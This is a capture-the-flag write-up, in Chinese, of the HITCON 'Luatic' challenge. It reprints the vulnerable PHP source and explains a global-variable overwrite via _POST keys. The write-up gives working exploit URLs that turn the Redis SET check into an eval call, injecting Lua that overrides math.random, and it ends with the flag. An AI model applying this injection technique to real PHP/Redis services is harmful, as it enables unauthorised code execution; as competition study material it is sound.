# Luatic

Source Code:

```php
<?php
    /* Author: Orange Tsai(@orange_8361) */
    include "config.php";

    foreach($_REQUEST as $k=>$v) {
        if( strlen($k) > 0 && preg_match('/^(FLAG|MY_|TEST_|GLOBALS)/i',$k)  )
            exit('Shame on you');
    }

    foreach(Array('_GET','_POST') as $request) {
        foreach($$request as $k => $v) ${$k} = str_replace(str_split("[]{}=.'\""), "", $v);
    }

    if (strlen($token) == 0) highlight_file(__FILE__) and exit();
    if (!preg_match('/^[a-f0-9-]{36}$/', $token)) die('Shame on you');

    $guess = (int)$guess;
    if ($guess == 0) die('Shame on you');

    // Check team token
    $status = check_team_redis_status($token);
    if ($status == "Invalid token") die('Invalid token');
    if (strlen($status) == 0 || $status == 'Stopped') die('Start Redis first');

    // Get team redis port
    $port = get_team_redis_port($token);
    if ((int)$port < 1024) die('Try again');

    // Connect, we rename insecure commands
    // rename-command CONFIG ""
    // rename-command SCRIPT ""
    // rename-command MODULE ""
    // rename-command SLAVEOF ""
    // rename-command REPLICAOF ""
    // rename-command SET $MY_SET_COMMAND
    $redis = new Redis();
    $redis->connect("127.0.0.1", $port);
    if (!$redis->auth($token)) die('Auth fail');

    // Check availability
    $redis->rawCommand($MY_SET_COMMAND, $TEST_KEY, $TEST_VALUE);
    if ($redis->get($TEST_KEY) !== $TEST_VALUE) die('Something Wrong?');

    // Lottery!
    $LUA_LOTTERY = "math.randomseed(ARGV[1]) for i=0, ARGV[2] do math.random() end return math.random(2^31-1)";
    $seed  = random_int(0, 0xffffffff / 2);
    $count = random_int(5, 10);
    $result = $redis->eval($LUA_LOTTERY, array($seed, $count));

    sleep(3); // Slow down...
    if ((int)$result === $guess)
        die("Congratulations, the flag is $FLAG");
    die(":(");
```


看到前幾行的

```php
foreach(Array('_GET','_POST') as $request) {
    foreach($$request as $k => $v) ${$k} = str_replace(str_split("[]{}=.'\""), "", $v);
}
```

我就立刻想到之前看過中國dedecms覆蓋Global變數的洞，漏洞成因就是跟上面這段code幾乎一樣

塞 `_POST[TEST_KEY]=123`，就能繞過檢查，蓋掉`$TEST_KEY`的值

所以我們就能完整控制 redis rawCommand 的參數

翻了文件，發現可以用 `eval`，其參數剛好可以調整到只塞兩個

之後我就太累睡著惹

醒來發現，隊友@Bookgin直接用eval蓋掉lua的`math random`，控制最後的result

```
http://54.250.242.183/luatic.php?token=[token]&guess=87&_POST[guess]=87&_POST[TEST_KEY]=function%20math%3Arandom()%20return%2087%20end&_POST[TEST_VALUE]=0

http://54.250.242.183/luatic.php?token=[token]&guess=87&_POST[guess]=87&_POST[MY_SET_COMMAND]=eval&_POST[TEST_KEY]=function%20math%3Arandom()%20return%2087%20end&_POST[TEST_VALUE]=0
```

`hitcon{Lua^H Red1s 1s m4g1c!!!}`




